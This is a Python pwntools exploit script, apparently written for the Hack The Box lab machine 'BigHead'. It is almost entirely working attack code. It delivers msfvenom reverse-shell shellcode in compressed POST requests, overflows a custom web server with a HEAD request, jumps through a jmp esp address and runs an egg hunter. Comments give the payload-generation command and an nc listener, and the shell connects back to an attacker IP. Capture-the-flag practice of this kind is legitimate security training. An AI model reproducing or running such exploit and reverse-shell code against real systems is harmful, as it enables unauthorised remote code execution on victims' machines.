#!/usr/bin/env python
# https://www.hackthebox.eu/home/machines/profile/164
# http://docs.pwntools.com/en/stable/
# schex / dualfade

# Attack Flow --
# Attacker (8+ requests) -> LB:80 (nginx proxy)-> BigHeadWebServer:8008 PE 32bit (Custom EXE app)
# nc -4 -lnvp 53 <- BigHeadWebServer (reverse shell) 

# Note: may need to exec script several times...
# Definitely buggy and not stable.

from pwn import *
import zlib

# TARGET
host = "dev.bighead.htb"
port = "80"

# GET requests to be sent 
requests = 8

# SHELLCODE --
# sudo msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.7 LPORT=53 EXITFUNC=thread -f python -b '\x00\x0a\x0d\xcc\x20'
# Payload size: 351 bytes
# Final size of python file: 1684 bytes

buf =  ""
buf += "\xbf\x93\x5e\xe1\x10\xd9\xcb\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x52\x31\x7b\x12\x03\x7b\x12\x83\x78\xa2\x03"
buf += "\xe5\x82\xb3\x46\x06\x7a\x44\x27\x8e\x9f\x75\x67\xf4"
buf += "\xd4\x26\x57\x7e\xb8\xca\x1c\xd2\x28\x58\x50\xfb\x5f"
buf += "\xe9\xdf\xdd\x6e\xea\x4c\x1d\xf1\x68\x8f\x72\xd1\x51"
buf += "\x40\x87\x10\x95\xbd\x6a\x40\x4e\xc9\xd9\x74\xfb\x87"
buf += "\xe1\xff\xb7\x06\x62\x1c\x0f\x28\x43\xb3\x1b\x73\x43"
buf += "\x32\xcf\x0f\xca\x2c\x0c\x35\x84\xc7\xe6\xc1\x17\x01"
buf += "\x37\x29\xbb\x6c\xf7\xd8\xc5\xa9\x30\x03\xb0\xc3\x42"
buf += "\xbe\xc3\x10\x38\x64\x41\x82\x9a\xef\xf1\x6e\x1a\x23"
buf += "\x67\xe5\x10\x88\xe3\xa1\x34\x0f\x27\xda\x41\x84\xc6"
buf += "\x0c\xc0\xde\xec\x88\x88\x85\x8d\x89\x74\x6b\xb1\xc9"
buf += "\xd6\xd4\x17\x82\xfb\x01\x2a\xc9\x93\xe6\x07\xf1\x63"
buf += "\x61\x1f\x82\x51\x2e\x8b\x0c\xda\xa7\x15\xcb\x1d\x92"
buf += "\xe2\x43\xe0\x1d\x13\x4a\x27\x49\x43\xe4\x8e\xf2\x08"
buf += "\xf4\x2f\x27\x9e\xa4\x9f\x98\x5f\x14\x60\x49\x08\x7e"
buf += "\x6f\xb6\x28\x81\xa5\xdf\xc3\x78\x2e\xea\x19\x8c\xa9"
buf += "\x82\x1f\x90\xb5\x67\xa9\x76\xdf\x97\xff\x21\x48\x01"
buf += "\x5a\xb9\xe9\xce\x70\xc4\x2a\x44\x77\x39\xe4\xad\xf2"
buf += "\x29\x91\x5d\x49\x13\x34\x61\x67\x3b\xda\xf0\xec\xbb"
buf += "\x95\xe8\xba\xec\xf2\xdf\xb2\x78\xef\x46\x6d\x9e\xf2"
buf += "\x1f\x56\x1a\x29\xdc\x59\xa3\xbc\x58\x7e\xb3\x78\x60"
buf += "\x3a\xe7\xd4\x37\x94\x51\x93\xe1\x56\x0b\x4d\x5d\x31"
buf += "\xdb\x08\xad\x82\x9d\x14\xf8\x74\x41\xa4\x55\xc1\x7e"
buf += "\x09\x32\xc5\x07\x77\xa2\x2a\xd2\x33\xc2\xc8\xf6\x49"
buf += "\x6b\x55\x93\xf3\xf6\x66\x4e\x37\x0f\xe5\x7a\xc8\xf4"
buf += "\xf5\x0f\xcd\xb1\xb1\xfc\xbf\xaa\x57\x02\x13\xca\x7d"

# -----------------------------------------------------------
# !mona jmp -r esp --
# Log data, item 7
# Address=62501331
# Message=  0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, 
# Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\BHWS_Backup\bHeadSvr.dll)

# echo "31135062" | xxd -p -u | sed -r 's/(..)/\\x\1/g'
# \x33\x31\x31\x33\x35\x30\x36\x32\x0A
# -----------------------------------------------------------

# @62501331 FFE4 JMP ESP
eip = "\x33\x31\x31\x33\x35\x30\x36\x32\x0A"

# EGG HUNTER --
# !mona egg -pbc "\x00" -t p00f 
# echo "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x70\x30\x30\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" | xxd -p
# echo "6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7" | xxd -p -u | sed -r 's/(..)/\\x\1/g'
hunter = "" 
hunter += "\x36\x36\x38\x31\x63\x61\x66\x66\x30\x66\x34\x32\x35\x32\x36\x61"
hunter += "\x30\x32\x35\x38\x63\x64\x32\x65\x33\x63\x30\x35\x35\x61\x37\x34"
hunter += "\x65\x66\x62\x38\x37\x30\x33\x30\x33\x30\x36\x36\x38\x62\x66\x61"
hunter += "\x61\x66\x37\x35\x65\x61\x61\x66\x37\x35\x65\x37\x66\x66\x65\x37"

# -----------------------------------------------------------
# STAGE1 --
# Send normal http POST Request --
# zlib compressed payload into target memory --
# -----------------------------------------------------------
payload = ""
payload += "p00fp00f"
payload += "\x90"*8
payload += buf

stage1 = ""
stage1 += "POST / HTTP/1.1\r\nContent-Encoding: gzip\r\nHost: " + host + ":" + port + "\r\n"
stage1 += "Content-Length: {}\r\n\r\n".format(len(payload)) + zlib.compress(payload) + "\r\n\r\n"

# -----------------------------------------------------------
# STAGE2 --
# Overflow EIP / Spawn Reverse Shell --
# STAGE2: Overflow  / Shellcode --
# "HEAD /coffee" + "\x41"*66 + "\x42"*8 + "\x43"*88
# -----------------------------------------------------------

stage2 = ""
stage2 += "HEAD /coffee" + "\x41"*66 + "\x33\x31\x31\x33\x35\x30\x36\x32"
stage2 += hunter
stage2 += " HTTP/1.1 \r\nHost: " + host + ":" + port + "\r\n\r\n"

# -----------------------------------------------------------
# Send Payload and exploit
# -----------------------------------------------------------

# Load balancer with 8 instances running --
# modify request as needed.
# Egg / Nops / Shellcode into target mem -- 
print "[+] Sending Requests"
print "[+] Sending Egg + Nops + Shellcode\n"
for i in range(requests):
    r = remote(host, port)
    r.send(stage1)
    r.close()

# Overflow / egg hunter / exec rev shell --
print "\n[+] Sending Overflow + Hunter"
r = remote(host, port)
r.send(stage2)
print(r.recvline(timeout=5))
r.close()
print "[+] Spawning reverse shell"
print "[+] Takes a few minutes.."
print "[+] Shell ??\n"

# __EOF __
